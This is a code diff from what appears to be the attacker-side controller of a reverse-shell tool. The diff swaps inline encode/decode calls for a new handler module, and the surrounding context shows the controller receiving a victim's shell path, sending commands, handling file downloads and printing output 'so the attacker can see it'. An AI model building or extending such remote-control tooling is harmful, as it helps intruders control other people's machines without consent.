@@ -14,6 +14,7 @@ import locale
 
 import command
 import constant
+import handler
 import logger
 import screenshot
 
@@ -105,7 +106,7 @@ def main():
                     # Receive shell info.
                     data = conn.recv(constant.BUF_SIZE)
                     # Shell info is the path.
-                    path = data.decode(constant.DECODE_TYPE)
+                    path = handler.decode(data)
 
                     valid_internal_cmd = False
 
@@ -126,7 +127,7 @@ def main():
                         valid_internal_cmd = True
 
                     # Send command.
-                    conn.sendall(full_cmd.encode(constant.ENCODE_TYPE))
+                    conn.sendall(handler.encode(full_cmd))
 
 
                     # Check internal command.
@@ -156,7 +157,7 @@ def main():
 
                         if rl_cmd == command.Command.DOWNLOAD.value:
                             result = conn.recv(constant.BUF_SIZE)
-                            msg = result.decode(constant.DECODE_TYPE)
+                            msg = handler.decode(result)
 
                             logger.info(msg)
 
@@ -169,7 +170,7 @@ def main():
                         result = conn.recv(constant.BUF_SIZE)
 
                         # Convert to bytes[].
-                        outs = result.decode(constant.DECODE_TYPE)
+                        outs = handler.decode(result)
 
                         # Print out the result, so the attacker can see it.
                         print(outs)
